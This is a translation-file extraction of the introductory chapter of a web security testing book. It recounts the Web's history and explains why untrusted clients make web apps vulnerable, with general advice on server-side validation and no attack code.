          <source>The Web began largely as a replacement for the major functionality of the Internet: e-mail and File Transfer Protocol (FTP): ways of communicating and sharing files. Initially, the method for sharing files between many users was a system called &lt;span class="docEmphStrong"&gt;gopher&lt;/span&gt;. Much like the Web we know today, gopher allowed users to search for documents using Veronica (the Google &lt;a name="iddle1657"&gt;&lt;/a&gt;of its time), and documents could be linked together and navigated to. However, by the end of the 1990s, gopher had pretty much disappeared. The reasons are many and varied, but perhaps the most significant is that the University of Michigan (who invented the technology) decided it wanted to charge for its use. As a result, people flocked to the free World Wide Web. Also, HTML, the &amp;quot;language&amp;quot; of the Web, was much more powerful and expressive than that used by gopher.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The Web packaged file sharing in a simple-to-use and straightforward way. (Anyone who has ever uuencoded and uudecoded a file will tell you that was a heck of a gift to humanity!) Thus, one could use his own computer to browse files stored on another person's computer. Distance didn't matter. Operating platform didn't matter. Format didn't matter.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The magic behind this was a server-side program called a Web server that allowed remote clients to access certain parts of the server computer's hard drive. The Web changed everything about the way we shared files and communicated information.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Now all we needed was a good way of browsing all this information. Sitting in front of an operating system prompt may have made us feel like we were staring into the vast void of cyberspace, but as the user base began to grow, such manual Web surfing seemed inefficient. The need for better client-side tools became real, and real need created a market.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>And that's when the Web browser was born. It was the ultimate tool for a client computer to connect to the growing number of Web pages that were sprouting up on servers everywhere.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But even with these new tools, the main users of the Web continued to be the scientists, researchers, and pioneers who had the biggest need for data sharing. And like any cool invention in science, word gets out. When word got out about the Web and its capabilities, the business world stood up and noticed.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Here we have a World Wide Web that can reach everyone, everywhere, with a computer. The marketing people saw its potential. The sales people agreed, and soon upper management was convinced.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The Web went public.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Now, instead of being relegated only to university professors, everyone suddenly had a home page. News stations would broadcast theirs at the end of their newscast (complete with the then-mandatory http:// and .com address). Television commercials would include a universal resource locator (URL) to guide users to more information about the company or service being advertised.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But &amp;quot;more information&amp;quot; was still all the Web was capable of giving us: static content downloaded quickly and easily.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Surely there was more to this awesome capability afforded by the Web than just static Web pages! Shouldn't it be possible for the Web server to do more than just serve static content to be displayed by a Web browser? What if the browser served as the user interface into the server itself? What if one could sit on some computer in Iowa and interact with a Web server in Amsterdam?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Think about the possibility. We use our phone to call a travel agent. The travel agent listens to our request and then types that data into a computer and tells us the outcome. Why can't we type the data into the travel agent's computer directly? Why do we need this extra human layer between the client and the server?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Well, there's no technical reason, thus Web interactivity was born. Today's Web pages now contain forms where data can be entered and transmitted directly to a database on some remote server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The true potential of the World Wide Web is finally being realized. Not only can we use the Web to transfer information, but we can use it to interact directly with customers and remote users.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Companies are flocking to the Web with their content, their interactivity, and their plans for mining gold! Amazon, eBay, and all the sites we now take for granted pioneered the way. They built e-commerce engines equipped with shopping carts and personalized recommendations to improve our online experience.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>We've come a long way since the academic world used the same mechanism just to trade research papers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch01lev1sec4.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>The Price of Web Utopia</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>The Price of Web Utopia</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This Internet boom saw its effect sweep the modern world. The phrase &lt;span class="docEmphStrong"&gt;dot-com&lt;/span&gt; became a household word and was even used as a sound bite for some television commercial advertisers. The phenomenon of companies flocking to the Web also had a name on Wall Street: the &lt;span class="docEmphStrong"&gt;dot-com boom&lt;/span&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Companies rushed to create a Web presence. HTML developers found themselves making more money than most C++ programmers, and Web sites popped up everywhere. Many of these sites were static, information-only pages, but others were breaking new ground by making their sites interactive.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>All of the sudden, we found ourselves &lt;span class="docEmphasis"&gt;buying&lt;/span&gt; things on the Web!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The Web began competing with magazine publishers, shopping malls, retail centers, call centers, and, yes, even the music and motion picture industries. Phone companies grasped the shift to the general public and began investing heavily in exploiting their existing phone networks for Internet-based communications. By the end of the 1990s, it was hard to find anyone who hadn't heard of the Web, and now it is equally hard to find someone who has never shopped on the Web.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>All of these emerging applications for the Web broke new ground in the world of software and networks. Web applications are different from traditional &lt;span class="docEmphStrong"&gt;client-server (C-S)&lt;/span&gt; applications, and as is the case with a lot of new computing technology, our rush to implement meant that we made many mistakes.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch01lev1sec5.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>The Web Versus Client-Server</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec4.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>The Web Versus Client-Server</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The World Wide Web is a special case of the client-server paradigm. C-S means one or more centralized server computers that serve data, resources, programs, and so forth to a number of client computers. Traditionally, this involves a powerful central server connected to remote client computers that are often &amp;quot;dumb&amp;quot; in that they do no actual computation and simply provide an interface to the server. You can think of a &lt;span class="docEmphStrong"&gt;dumb terminal&lt;/span&gt; as a keyboard and monitor into the remote server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Many UNIX networks are servers that are connected to &lt;span class="docEmphStrong"&gt;thin clients&lt;/span&gt;, which means that most applications run on the server, but the clients are capable of local data storage and other small computational tasks. The server does most of the heavy lifting.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Windows networks are typically just the opposite, with the &amp;quot;fat client&amp;quot; possessing basic Office applications and browsing, with separate servers used for major services requiring either the network (Web server, DNS, and so on) or massive storage requirements (database and file servers).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The Web, however, is a special case of the C-S model using fat clients and operating on protocols like HTTP, HTML, XML, and Simple Object Access Protocol (SOAP), among others. Moreover, the Web adds the interesting problem of &amp;quot;untrusted&amp;quot; users. Whereas traditional networks exist within the firewalled protection of a company's private network, the Web is for anyone at any time.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In traditional C-S networks, it is fairly clear what processing should take place on the client and on the server. Furthermore, both the client and the server generally exist within the walls of a single company (and hence a protected environment).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But this is not the case with the World Wide Web, due in large part to the first two Ws: the World Wide part. The Web is different because the clients exist outside the control of the central server and the network. Unlike a LAN, the Web has no boundaries to protect. All the clients have to be treated as untrusted, which puts additional requirements on how computation is distributed across the client and the server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>LANs can be designed to maximize performance. The more computation that can be &amp;quot;pushed&amp;quot; to the client, the faster the central server can execute. Perhaps this is one reason why the fat client paradigm has won out over thin clients. The computational burden can be more distributed, speeding up the network for everyone.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But the Web is a different animal altogether. (See the sidebar &amp;quot;&lt;a class="docLink" href="#ch01sb01"&gt;Opposing Goals&lt;/a&gt;.&amp;quot;) It is essentially a network of untrusted clients, any of which might be hostile. This means that every input that originates at a client must be carefully checked, and all security operations must be performed on the server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h2.text">
          <source>Sidebar: Opposing Goals</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>There are many opposing goals in software development, but none is more important than security and its opposing requirements.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Chief among these opposing requirements are security versus reliability. Reliability often requires developers to write more code (for example, error-handling code), and more code means more opportunity to write bugs. And because error-handling code is often under-exercised in testing (it can be difficult to reach under laboratory circumstances), the chances that it harbors security bugs is greater. Error code needs to be carefully checked for security flaws.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Another important opposing factor is performance. The more code that is pushed to the client, the faster the server will run. But more code on the client means more opportunity for security breaches because the user has access to the code running on the client, as we'll see in &lt;a class="docLink" href="ch03.html#ch03"&gt;Chapter 3&lt;/a&gt;, &amp;quot;Attacking the Client.&amp;quot;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Usability may be next in line as an opposing force to security. Usability means providing information to users to make the system as easy to use as possible. Easy to use often means easy to hack, especially when error messages reveal information that's helpful to an attacker.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Throughout this book, we will be describing these opposing forces and offering advice on what testers can do about it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The specialized environment of the Web was not the network programming paradigm that software developers were used to. We programmed our first Web applications (apps) like we programmed our LAN apps: Use the clients as much as possible to speed up the server, and trust what data they provide. The result: hacks, cracks, worms, viruses, and a World Wide Web in chaos.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The reasons for this collective failure of the Web development community are many and varied. Some accounting of them follows:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>We underestimated the target that Web servers would become.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>As Web sites quickly sprouted up all over the planet, the hackers sat up and took notice. Here were powerful machines that often existed inside corporate firewalls in (at least) a semi-trusted environment. What better machine to compromise than a Web server with lots of power and a high bandwidth connection?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Add to this that Web servers are busy machines, and we give the attacker a whole lot of traffic to hide in. Web servers often contain sensitive customer data that a hacker would covet.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Web servers are good targets with little chance of detection. What hacker wouldn't smile at the thought of this? Well, lots of them did more than smile, and we are still grappling with the problem that our Web servers are prime targets for hackers.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>We rushed too quickly into Web development, forgetting the lessons we had learned from traditional software development projects.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>The newness of the Web ensured that any Web developer was bound to be a beginner no matter how long he had spent writing software. Novice programmers were also attracted to the simplicity of HTML over traditional programming languages like C. Thus, Web applications were built without the care and due process spent on building traditional server and standalone applications.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>We threw out a great deal of good engineering practice when the Web was young.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Web development is marked by ultra-short development cycles, which means less time for review, testing, and quality assurance practices.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Web development is also component-based, meaning that developers build an application by gluing together existing components and then customizing those components for their specific application. Using these existing components means that Web applications can be developed without any real understanding of the underlying implementation details.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>It's a wonder that we managed to get as much right as we actually did!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>We forgot that the Web is different.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>The Web differs in many fundamental and important ways from traditional client-server networks. For one thing, users are anonymous, and just about anything can be spoofed or faked. That makes accountability hard to manage.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Also, the Web is stateless, so anything that needs to be saved from a single Web session must be stored intermediately somewhere else. Thus, it was necessary to concoct an artificial mechanism for managing stateful transactions. That's why things like cookies and hidden fields (see &lt;a class="docLink" href="ch04.html#ch04"&gt;Chapter 4&lt;/a&gt;, &amp;quot;State-Based Attacks&amp;quot;) have been widely exploited.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>The Web has no built-in security. Everything that is sensitive has to be managed by the Web application and dealt with on the combination of the Web server or client machine.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>But the rush to the Web dulled our senses to these issues. The result has been that most Web applications are vulnerable to some sort of attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It's time to bring the Web under control by treating it like the special case that it is. And that's why we wrote this book. The Web really is a special class of software. New development and testing techniques are necessary.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec4.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch01lev1sec6.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>A Fault Model for Web Apps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch01lev1sec5.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>A Fault Model for Web Apps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A transaction between a Web user and a Web server has three main components:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>The server computer where the Web content resides</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>The client computer where the content is to be served</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>The network that connects the two.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>The Web Server</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Testing from the Web server is similar to testing any server application. The topic is covered in the first two books of this series: &lt;span class="docEmphasis"&gt;How to Break Software&lt;/span&gt; and &lt;span class="docEmphasis"&gt;How to Break Software Security&lt;/span&gt;. It's the testing of the Web server application from the viewpoint of the Web client and the network that requires special testing techniques and is the focus of this book.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>The Web Client</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The Web client is where all of the important stuff takes place. It's where your customers sit, and it's also where your adversaries sit. The problem is that you want to build a Web application that your customers love but that is too tough of a target for your adversaries.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Testing from the Web client requires many special considerations:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>A malicious user can tamper with all data that's stored on the Web client.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Never forget that Web clients are under full control of the user. Any sensitive information, implementation details, and so on that pass through the client are discoverable no matter how hard we try to protect them. Furthermore, we can bypass any validation code that we put on the client.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>The lesson: Don't do important computing or validation on the client without double-checking the data on the server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>All network traffic from the Web client must be validated and treated as untrustworthy.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Most client-side Web interaction goes through a Web browser, but that is not guaranteed. Nothing prevents a user from using a custom client or even tampering with data after it leaves the browser (between the browser and the networking APIs on the client).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>All network traffic that comes from the client must be validated.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>The user has access to all client-side source code.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>A malicious user can view and preempt all client-side code and data (HTML, Java, Flash, etc). This is a departure from ordinary applications</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>that appear to the user only as hexadecimal-encoded binary files. No secrets can be stored in the source, and anything that is in the source is subject to tampering.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>The client can discover details about server-side implementation.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Server-side error messages can be revealing. You can make guesses at the directory structure and file locations. You can glean versions of databases and so forth from standard error messages. If you are relying on a user not being able to determine the configuration of the server, you are fooling yourself. Security must be tighter than simply assuming that users are in the dark. They aren't.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>The Network</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The network that connects a Web client to your server is a chaotic place. (For a lighthearted and enjoyable view of Web-based network traffic, a great movie explaining this is called &lt;span class="docEmphasis"&gt;Warriors of the Net&lt;/span&gt;, made by Ericsson Media Lab and available at &lt;a class="docLink" target="_blank" href="http://www.warriorsofthe.net"&gt;www.warriorsofthe.net&lt;/a&gt;.) Web traffic can be intercepted and tampered with when it is transmitted in plain text.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A protocol called HyperText Transfer Protocol over Secure Sockets (HTTPS) is a secure transport mechanism of HTTP that automatically encrypts traffic sent over a Web connection. But we must remember that the data that goes into an HTTPS session begins its life on the client. Before it is encrypted, it may have already been tampered with.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Encryption is no real protection except in preventing the data from being tampered with, or spied upon, while in transmission.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Denial of service is another network-based attack that concerns Web developers but is beyond the scope of this book. We do, however, touch upon it in &lt;a class="docLink" href="ch07lev1sec2.html#ch07lev2sec4"&gt;attack 20&lt;/a&gt;.</source>
          <target></target>
